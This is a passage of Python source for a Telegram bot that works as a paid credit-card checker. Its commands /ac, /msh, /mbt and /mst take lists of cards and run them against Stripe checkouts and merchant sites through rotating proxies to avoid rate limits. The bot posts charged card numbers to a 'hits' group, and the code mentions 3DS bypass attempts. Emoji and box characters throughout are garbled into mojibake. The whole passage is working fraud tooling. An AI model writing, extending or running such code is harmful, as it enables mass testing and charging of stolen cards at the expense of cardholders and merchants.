    txt += "Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('MERCHANT:')}</b> {_esc(merchant or product or 'N/A')}\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('PRODUCT:')}</b> {_esc(product or 'N/A')}\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('AMOUNT:')}</b> {_esc(amount_str)}\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('PK:')}</b> <code>{_esc(pk_short)}</code>\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('SESSION:')}</b> <code>{_esc(cs_short)}</code>\n"
    if email:
        txt += f"Ã¢â€“Â¸ <b>{sc('EMAIL:')}</b> {_esc(email)}\n"
    # Show intent type if found
    _intent_type = info.get("intent_type", "")
    if _intent_type:
        _itype_label = "PaymentIntent" if _intent_type == "payment_intent" else "SetupIntent"
        _has_secret = bool(info.get("pi_client_secret") or info.get("si_client_secret"))
        txt += f"Ã¢â€“Â¸ <b>{sc('FLOW:')}</b> {_itype_label} {'Ã¢Å“â€¦' if _has_secret else 'Ã¢Å¡Â Ã¯Â¸Â'}\n"
    txt += "\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n"
    txt += f"Ã¢Å“â€¦ {sc('CHECKOUT READY!')}\n\n"
    txt += f"Ã¢â€“Â¸ Send up to <b>{AC_MAX_CARDS}</b> cards (one per line: <code>cc|mm|yy|cvv</code>)\n"
    txt += f"Ã¢â€“Â¸ <b>1 credit</b> per card tried"

    bot.edit_message_text(txt, cid, status_msg.message_id, parse_mode="HTML")


def _handle_ac_cards(message):
    """Process cards sent after checkout info was fetched."""
    cid = message.chat.id
    uid = getattr(message.from_user, "id", None)
    ac_data = pending_ac_cards.pop(cid, None)
    if not ac_data:
        return

    text = (message.text or "").strip()
    lines = text.split("\n")
    cards = [x.strip() for x in lines if x.strip() and x.count("|") == 3]

    if not cards:
        bot.reply_to(message, "Ã¢ÂÅ’ No valid cards found. Format: <code>cc|mm|yy|cvv</code>", parse_mode="HTML")
        return

    if len(cards) > AC_MAX_CARDS:
        cards = cards[:AC_MAX_CARDS]

    _is_owner = (uid in OWNER_IDS)
    _has_plan = _user_has_active_plan(uid)
    if not _is_owner and not _has_plan:
        cred = get_credits(uid)
        needed = len(cards) * CREDITS_PER_CHECK
        if cred is None or cred < needed:
            bot.reply_to(message, f"Insufficient credits. Need {needed} credits for {len(cards)} cards.", parse_mode="HTML")
            return
        if not deduct_credits(uid, needed):
            bot.reply_to(message, "Insufficient credits.", parse_mode="HTML")
            return

    sc = _to_bold_sans
    pk = ac_data["pk"]
    cs_id = ac_data["cs_id"]
    amount = ac_data.get("amount", "N/A")
    amount_cents = ac_data.get("amount_cents", 0)
    currency = ac_data.get("currency", "USD")
    product = ac_data.get("product", "N/A")
    merchant = ac_data.get("merchant", "")
    email = ac_data.get("email", "")
    checkout_url = ac_data.get("url", "")
    # Intent data for direct confirm flow
    pi_id = ac_data.get("pi_id", "")
    pi_client_secret = ac_data.get("pi_client_secret", "")
    si_id = ac_data.get("si_id", "")
    si_client_secret = ac_data.get("si_client_secret", "")
    intent_type = ac_data.get("intent_type", "")
    _cur_symbols = {"USD": "$", "EUR": "Ã¢â€šÂ¬", "GBP": "Ã‚Â£", "INR": "Ã¢â€šÂ¹", "CAD": "CA$", "AUD": "A$", "JPY": "Ã‚Â¥", "BRL": "R$"}
    cur_sym = _cur_symbols.get(currency, "")
    if amount and amount != "N/A":
        try:
            amt_f = float(amount)
            amt_display = f"{amt_f:.0f}" if amt_f == int(amt_f) else f"{amt_f:.2f}"
        except (ValueError, TypeError):
            amt_display = amount
        amount_str = f"{cur_sym}{amt_display} {currency}" if cur_sym else f"{amt_display} {currency}"
    else:
        amount_str = "N/A"

    # Status message
    txt  = f"<b>{sc('STRIPE AUTO-CHECKOUT')}</b> Ã¢Å¡Â¡\n"
    txt += "Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('CARDS:')}</b> 0/{len(cards)}\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('HITS:')}</b> 0\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('STATUS:')}</b> {sc('STARTING...')}\n"
    status_msg = bot.reply_to(message, txt, parse_mode="HTML")

    # Run checkout in mass pool
    def _run_ac_body():
        hits = 0
        declined = 0
        errors = 0
        hit_cards = []

        # Get user proxy if any
        _user_proxies = user_proxies.get(cid) or []
        _user_proxy = _user_proxies[0] if _user_proxies else None

        for idx, card in enumerate(cards):
            card = card.strip()
            if cid in _stop_flags:
                break

            try:
                fut = asyncio.run_coroutine_threadsafe(
                    try_checkout_card(
                        pk=pk,
                        cs_id=cs_id,
                        card_str=card,
                        checkout_url=checkout_url,
                        amount_cents=amount_cents,
                        currency=currency,
                        email=email,
                        proxy_url=_user_proxy,
                        pi_id=pi_id,
                        pi_client_secret=pi_client_secret,
                        si_id=si_id,
                        si_client_secret=si_client_secret,
                        intent_type=intent_type,
                        verbose=DEBUG,
                    ),
                    _shared_loop,
                )
                result = fut.result(timeout=60)
            except Exception as e:
                if DEBUG:
                    print(f"[StripeAC] Exception for card {card[:6]}****: {type(e).__name__}: {e}")
                result = {"status": "Error", "message": str(e)[:200], "error_code": "EXCEPTION"}

            st = result.get("status", "Error")
            err_code = result.get("error_code", "")
            if DEBUG:
                print(f"[StripeAC] Card {idx+1}/{len(cards)}: {st} Ã¢â‚¬â€ {err_code} Ã¢â‚¬â€ {result.get('message','')[:100]}")

            # Session expired Ã¢â‚¬â€ stop all checks immediately
            if err_code == "SESSION_EXPIRED":
                errors += 1
                try:
                    exp_txt  = f"<b>{sc('STRIPE AUTO-CHECKOUT')}</b> Ã¢Å¡Â¡\n"
                    exp_txt += "Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\n"
                    exp_txt += f"Ã¢Å¡Â Ã¯Â¸Â <b>{sc('SESSION EXPIRED')}</b>\n\n"
                    exp_txt += f"Ã¢â€“Â¸ {sc('Checkout session is no longer active.')}\n"
                    exp_txt += f"Ã¢â€“Â¸ {sc('Checked:')} {idx + 1}/{len(cards)}\n"
                    exp_txt += f"Ã¢â€“Â¸ Ã°Å¸â€™Å½ {sc('Charged:')} {hits}\n"
                    exp_txt += f"Ã¢â€“Â¸ Ã¢ÂÅ’ {sc('Declined:')} {declined}\n\n"
                    exp_txt += f"Ã¢â€“Â¸ {sc('Please create a new checkout link and try again with /ac')}"
                    _safe_edit_message_text(exp_txt, cid, status_msg.message_id, parse_mode="HTML")
                except Exception:
                    pass
                # Refund remaining unchecked cards
                remaining = len(cards) - (idx + 1)
                if remaining > 0 and not _is_owner:
                    try:
                        coll = _users_coll()
                        if coll is not None:
                            coll.update_one({"_id": uid}, {"$inc": {"credits": remaining * CREDITS_PER_CHECK}})
                            _invalidate_user_cache(uid)
                    except Exception:
                        pass
                increment_total_checks(uid, idx + 1)
                if hits > 0:
                    increment_total_hits(uid, hits)
                return

            if st == "Charged":
                hits += 1
                hit_cards.append((card, result))
                # Send hit notification (Charged or 3DS Bypassed)
                _bg_fire(_ac_send_hit, message, card, "CHARGED", result, product, amount_str, merchant)
            elif st == "Approved" and err_code == "3DS_CHALLENGE":
                # 3DS bypass attempted but challenge required Ã¢â‚¬â€ cannot complete checkout
                declined += 1
            elif st == "Approved":
                # 3DS = card is live but not charged Ã¢â‚¬â€ count as declined
                declined += 1
            elif st == "Declined":
                declined += 1
            else:
                errors += 1

            # Update status every 2 cards or on last card or on hits
            if idx % 2 == 1 or idx == len(cards) - 1 or st == "Charged":
                try:
                    upd  = f"<b>{sc('STRIPE AUTO-CHECKOUT')}</b> Ã¢Å¡Â¡\n"
                    upd += "Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\n"
                    upd += f"Ã¢â€“Â¸ <b>{sc('PROGRESS:')}</b> {idx + 1}/{len(cards)}\n"
                    upd += f"Ã¢â€“Â¸ <b>{sc('CHARGED:')}</b> Ã°Å¸â€™Å½ {hits}\n"
                    upd += f"Ã¢â€“Â¸ <b>{sc('DECLINED:')}</b> {declined}\n"
                    upd += f"Ã¢â€“Â¸ <b>{sc('ERRORS:')}</b> {errors}\n"
                    upd += f"Ã¢â€“Â¸ <b>{sc('STATUS:')}</b> {sc('CHECKING...')}\n"
                    _safe_edit_message_text(upd, cid, status_msg.message_id, parse_mode="HTML")
                except Exception:
                    pass

            # Delay between cards (kept short Ã¢â‚¬â€ session reuse makes fast iteration safe)
            if idx < len(cards) - 1:
                time.sleep(random.uniform(0.3, 0.8))

        # Ã¢â€â‚¬Ã¢â€â‚¬ Final summary Ã¢â€â‚¬Ã¢â€â‚¬
        total_checked = hits + declined + errors
        refund = errors * CREDITS_PER_CHECK  # Refund errors
        if refund > 0 and not _is_owner:
            try:
                coll = _users_coll()
                if coll is not None:
                    coll.update_one({"_id": uid}, {"$inc": {"credits": refund}})
                    _invalidate_user_cache(uid)
            except Exception:
                pass

        increment_total_checks(uid, total_checked)
        if hits > 0:
            increment_total_hits(uid, hits)

        txt  = f"<b>{sc('STRIPE AUTO-CHECKOUT COMPLETE')}</b> Ã¢Å¡Â¡\n"
        txt += "Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\n"
        txt += f"Ã¢â€“Â¸ <b>{sc('TOTAL:')}</b> {total_checked}/{len(cards)}\n"
        txt += f"Ã¢â€“Â¸ <b>{sc('CHARGED:')}</b> Ã°Å¸â€™Å½ {hits}\n"
        txt += f"Ã¢â€“Â¸ <b>{sc('DECLINED:')}</b> Ã¢ÂÅ’ {declined}\n"
        txt += f"Ã¢â€“Â¸ <b>{sc('ERRORS:')}</b> Ã¢Å¡Â Ã¯Â¸Â {errors}\n"
        if refund > 0:
            txt += f"Ã¢â€“Â¸ <b>{sc('REFUNDED:')}</b> Ã°Å¸â€™Â° {refund} credits\n"
        txt += "\n"
        txt += f"Ã¢â€“Â¸ <b>{sc('PRODUCT:')}</b> {_esc(product or 'N/A')}\n"
        txt += f"Ã¢â€“Â¸ <b>{sc('AMOUNT:')}</b> {_esc(amount_str)}\n"
        txt += f"\nÃ¢â€“Â¸ <b>" + sc("GATE:") + "</b> " + sc("STRIPE [AUTO-CHECKOUT]")

        # Show hit cards
        if hit_cards:
            txt += "\n\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n"
            txt += f"<b>{sc('CHARGED CARDS:')}</b>\n"
            for hcard, hresult in hit_cards:
                hcode = hresult.get("error_code", "")
                txt += f"Ã°Å¸â€™Å½ <code>{hcard}</code> Ã¢â‚¬â€ Charged ({hcode})\n"

        _safe_edit_message_text(txt, cid, status_msg.message_id, parse_mode="HTML")

    # Run in mass pool
    _mass_pool.submit(_run_ac_body)


def _ac_send_hit(message, card_str, status_label, result, product, amount_str, merchant):
    """Send a hit notification for auto-checkout (hits group + support group)."""
    name = _user_display(message)
    sc = _to_bold_sans
    response = result.get("error_code", "") or result.get("message", "")
    site_label = merchant or "Stripe Checkout"

    header = f"Ã°Å¸â€™Å½ <b>{sc('AC CHARGED')}</b> Ã°Å¸â€™Å½"

    txt  = f"{header}\n"
    txt += "Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('CARD:')}</b> <code>{card_str}</code>\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('STATUS:')}</b> {status_label}\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('RESPONSE:')}</b> {_esc(response)}\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('MERCHANT:')}</b> {_esc(site_label)}\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('PRODUCT:')}</b> {_esc(product or 'N/A')}\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('AMOUNT:')}</b> {_esc(amount_str)}\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('SOURCE:')}</b> Auto-Checkout\n\n"
    txt += f"Ã°Å¸â€˜Â¤ <b>{sc('USER:')}</b> {name}"

    # Hits group
    if SHIRO_HITS_CHAT:
        try:
            bot.send_message(SHIRO_HITS_CHAT, txt, parse_mode="HTML")
        except Exception as e:
            print(f"[AC HIT] Ã¢Å¡Â Ã¯Â¸Â Failed to send to hits chat: {e}")

    # Support group
    if AUTO_JOIN_GROUP:
        try:
            hit_txt  = f"Ã°Å¸â€™Å½ <b>{sc('CHARGE HIT DETECTED')}</b> Ã°Å¸â€™Å½\n\n"
            hit_txt += f"{sc('STATUS')}  Ã¢Å¾Å“  <b>{status_label}</b>\n"
            hit_txt += f"{sc('RESPONSE')}  Ã¢Å¾Å“  <b>{_esc(response)}</b>\n"
            hit_txt += f"{sc('GATEWAY')}  Ã¢Å¾Å“  <b>Stripe AC</b>\n"
            hit_txt += f"{sc('PRICE')}  Ã¢Å¾Å“  <b>{_esc(amount_str)}</b>\n\n"
            hit_txt += f"Ã°Å¸â€˜Â¤ {sc('USER')}  Ã¢Å¾Å“  <b>{name}</b>"
            bot.send_message(AUTO_JOIN_GROUP, hit_txt, parse_mode="HTML")
        except Exception as e:
            print(f"[AC HIT] Ã¢Å¡Â Ã¯Â¸Â Failed to send hit to {AUTO_JOIN_GROUP}: {e}")


@bot.message_handler(commands=["msh"])
@_crash_safe
def cmd_msh(message):
    cid = message.chat.id
    uid = getattr(message.from_user, "id", None)
    _log_cmd(message, "/msh")
    if not uid or not is_registered(uid):
        bot.reply_to(message, "Register first to use the bot. Use /register or press Register on /start.", parse_mode="HTML")
        return
    update_user_activity(uid, username=getattr(message.from_user, 'username', None), first_name=getattr(message.from_user, 'first_name', None))
    sites = get_sites(cid)
    if not sites:
        bot.reply_to(message, "No sites. <code>/setsite</code> to add.", parse_mode="HTML")
        return
    pending_msh[cid] = time.time()
    bot.reply_to(
        message,
        f"Send cards (one per line: cc|mm|yy|cvv) or a .txt file. Max <b>{MASS_MAX_CARDS}</b> cards, 1 credit per card.",
        parse_mode="HTML",
    )


@bot.message_handler(commands=["mbt"])
@_crash_safe
def cmd_mbt(message):
    cid = message.chat.id
    uid = getattr(message.from_user, "id", None)
    _log_cmd(message, "/mbt")
    if not uid or not is_registered(uid):
        bot.reply_to(message, "Register first to use the bot. Use /register or press Register on /start.", parse_mode="HTML")
        return
    update_user_activity(uid, username=getattr(message.from_user, 'username', None), first_name=getattr(message.from_user, 'first_name', None))
    bt_sites = get_bt_sites(cid)
    if not bt_sites:
        bot.reply_to(message, "No BT sites. <code>/btsite</code> to add.", parse_mode="HTML")
        return
    pending_mbt[cid] = time.time()
    bot.reply_to(
        message,
        f"Send cards (one per line: cc|mm|yy|cvv) or a .txt file. Max <b>{MASS_MAX_CARDS}</b> cards, 1 credit per card.",
        parse_mode="HTML",
    )


# Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
#  /mst Ã¢â‚¬â€ Stripe Charge Mass Check
# Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â

@bot.message_handler(commands=["mst"])
@_crash_safe
def cmd_mst(message):
    cid = message.chat.id
    uid = getattr(message.from_user, "id", None)
    _log_cmd(message, "/mst")
    if not uid or not is_registered(uid):
        bot.reply_to(message, "Register first. Use /start.", parse_mode="HTML")
        return
    update_user_activity(uid, username=getattr(message.from_user, 'username', None))
    if not _HAS_ST:
        bot.reply_to(message, "Ã¢ÂÅ’ Stripe Charge API not available.")
        return
    proxies = get_proxies(cid)
    if uid and cid != uid and not proxies:
        proxies = get_proxies(uid)
    if not proxies:
        bot.reply_to(message, "Ã¢Å¡Â Ã¯Â¸Â <b>Proxies required.</b> Add proxies first using <code>/setproxies</code> to avoid rate limits.", parse_mode="HTML")
        return
    pending_mst[cid] = time.time()
    bot.reply_to(
        message,
        f"Send cards (one per line: cc|mm|yy|cvv) or a .txt file. Max <b>{MASS_MAX_CARDS}</b> cards, 1 credit per card.",
        parse_mode="HTML",
    )


def _run_st_mass_inner(message, cid, uid, cards, proxies, _is_owner):
    total = len(cards)
    charged = 0
    approved = 0
    declined = 0
    errors = 0
    done = 0
    _stop_flags.pop(cid, None)
    charged_cards = []
    approved_cards = []
    declined_cards = []
    error_cards = []
    _check_start_time = time.time()

    def _st_mass_kb(final=False):
        kb = types.InlineKeyboardMarkup(row_width=4)
        kb.row(
            types.InlineKeyboardButton(f"Ã°Å¸â€™Å½ Charged Ã‚Â· {charged}", callback_data="msh_noop"),
            types.InlineKeyboardButton(f"Ã¢Å“â€¦ Approved Ã‚Â· {approved}", callback_data="msh_noop"),
        )
        kb.row(
            types.InlineKeyboardButton(f"Ã¢ÂÅ’ Declined Ã‚Â· {declined}", callback_data="msh_noop"),
            types.InlineKeyboardButton(f"Ã¢Å¡Â Ã¯Â¸Â Errors Ã‚Â· {errors}", callback_data="msh_noop"),
        )
        if not final:
            kb.row(types.InlineKeyboardButton("Ã°Å¸â€ºâ€˜ Stop Check", callback_data=f"msh_stop_{cid}"))
        return kb

    def _st_mass_text(final=False):
        sc = _to_bold_sans
        elapsed = time.time() - _check_start_time
        mins, secs = divmod(int(elapsed), 60)
        time_str = f"{mins}:{secs:02d}" if mins else f"0:{secs:02d}"
        pct = (100.0 * done / total) if total else 0.0
        bar_len = 20
        filled = int(bar_len * done / total) if total else 0
        bar = "Ã¢â€“Ë†" * filled + "Ã¢â€“â€˜" * (bar_len - filled)
        speed = done / elapsed if elapsed > 0 else 0.0
        speed_str = f"{speed:.2f}" if speed < 1 else f"{speed:.1f}"
        _spin = "Ã¢â€”ÂÃ¢â€”â€œÃ¢â€”â€˜Ã¢â€”â€™"
        spin = _spin[done % len(_spin)] if not final else "Ã¢Å“â€¦"

        txt = f"Ã¢Å¡Â¡ <b>{sc('STRIPE CHARGE MASS CHECK')}</b>\n\n"
        if final:
            hits = charged + approved
            hit_rate = (hits / done * 100) if done > 0 else 0.0
            txt += f"Ã¢Å“â€¦ <b>{sc('COMPLETED')}</b>\n"
            txt += f"<code>Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°Ã¢â€“Â°</code> <b>100%</b>\n\n"
            txt += f"Ã°Å¸â€œÅ  <b>STATISTICS</b>\n"
            txt += f"Cards    Ã‚Â· <code>{done}/{total}</code>\n"
            txt += f"Time     Ã‚Â· <code>{time_str}</code>\n"
            txt += f"Speed    Ã‚Â· <code>{speed_str} c/s</code>\n"
            txt += f"Hit Rate Ã‚Â· <b>{hit_rate:.1f}%</b>\n\n"
            txt += f"Ã¢Å¡â„¢Ã¯Â¸Â {sc('STRIPE CHARGE [MASS]')}  Ã‚Â·  {sc('SHIRO')} Ã¢Å¡Â¡"
        else:
            txt += f"{spin} <b>{sc('PROCESSING')}</b>\n"
            txt += f"<code>{bar}</code> <b>{pct:.0f}%</b>\n\n"
            txt += f"Ã°Å¸â€œÅ  <b>PROGRESS</b>\n"
            txt += f"Cards Ã‚Â· <code>{done}/{total}</code>\n"
            txt += f"Time  Ã‚Â· <code>{time_str}</code>\n"
            if speed > 0:
                remaining = (total - done) / speed
                r_mins, r_secs = divmod(int(remaining), 60)
                eta = f"{r_mins}:{r_secs:02d}" if r_mins else f"0:{r_secs:02d}"
                txt += f"Speed Ã‚Â· <code>{speed_str} c/s</code>\n"
                txt += f"ETA   Ã‚Â· <code>{eta}</code>\n"
            else:
                txt += f"Status Ã‚Â· {sc('STARTING...')}\n"
            txt += f"\nÃ°Å¸â€™Å½ <b>{charged}</b>  Ã¢Å“â€¦ <b>{approved}</b>  Ã¢ÂÅ’ <b>{declined}</b>  Ã¢Å¡Â Ã¯Â¸Â <b>{errors}</b>\n\n"
            txt += f"Ã¢Å¡â„¢Ã¯Â¸Â {sc('STRIPE CHARGE [MASS]')}"
        return txt

    status_msg = bot.reply_to(message, _st_mass_text(), parse_mode="HTML", reply_markup=_st_mass_kb())
    _last_edit = [0.0]
    _edit_lock = threading.Lock()

    def _update_status(force=False):
        now = time.time()
        if not force and now - _last_edit[0] < 2.0:
            return
        if not _edit_lock.acquire(blocking=False):
            return
        try:
            bot.edit_message_text(_st_mass_text(), cid, status_msg.message_id, parse_mode="HTML", reply_markup=_st_mass_kb())
            _last_edit[0] = time.time()
        except Exception:
            pass
        finally:
            _edit_lock.release()

    _has_plan = _user_has_active_plan(uid)

    for i, card_str in enumerate(cards):
        if _stop_flags.get(cid) or _mass_check_stop_flag:
            remaining = total - done
            if remaining > 0 and not _is_owner and not _has_plan:
                coll = _users_coll()
                if coll:
                    coll.update_one({"_id": uid}, {"$inc": {"credits": remaining * CREDITS_PER_CHECK}})
                    _invalidate_user_cache(uid)
            break
        proxy = None
        if proxies:
            p = _pick_proxy(proxies)
            if p:
                proxy = {"http": p, "https": p}
        try:
            result = _st_check_sync(card_str, proxy=proxy)
            if result is None:
                result = {"status": "Error", "message": "No response from gateway", "is_approved": False}
        except Exception as e:
            result = {"status": "Error", "message": str(e)[:100], "is_approved": False}
        status = result.get("status", "Error")
        msg_text = result.get("message", "")
        if status == "Charged":
            charged += 1
            increment_total_hits(uid, 1)
            charged_cards.append(card_str)
        elif status == "Approved":
            approved += 1
            increment_total_hits(uid, 1)
            approved_cards.append(card_str)
        elif status == "Declined":
            declined += 1
            declined_cards.append(f"{card_str} | {msg_text[:50]}")
        else:
            errors += 1
            error_cards.append(f"{card_str} | {msg_text[:50]}")
            if not _is_owner and not _has_plan:
                coll = _users_coll()
                if coll:
                    coll.update_one({"_id": uid}, {"$inc": {"credits": CREDITS_PER_CHECK}})
                    _invalidate_user_cache(uid)
        done += 1
        cc_short = card_str.split("|")[0][-4:]
        try:
            _bg_fire(_log_check_result, uid, cc_short, "StripeCharge", status, msg_text, "forechrist.com")
        except Exception:
            pass
        _update_status()

    # Final update
    increment_total_checks(uid, done)
    _update_status(force=True)
    # Send final completed text with keyboard
    try:
        bot.edit_message_text(_st_mass_text(final=True), cid, status_msg.message_id, parse_mode="HTML", reply_markup=_st_mass_kb(final=True))
    except Exception:
        pass

    # Build and send results file
    sc = _to_bold_sans
    elapsed = time.time() - _check_start_time
    hits = charged + approved
    hit_rate = (hits / done * 100) if done > 0 else 0.0
    mins, secs = divmod(int(elapsed), 60)
    f_time = f"{mins}:{secs:02d}" if mins else f"0:{secs:02d}"

    file_lines = []
    file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
    file_lines.append("     Ã¢Å¡Â¡ STRIPE CHARGE MASS RESULTS")
    file_lines.append("Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â")
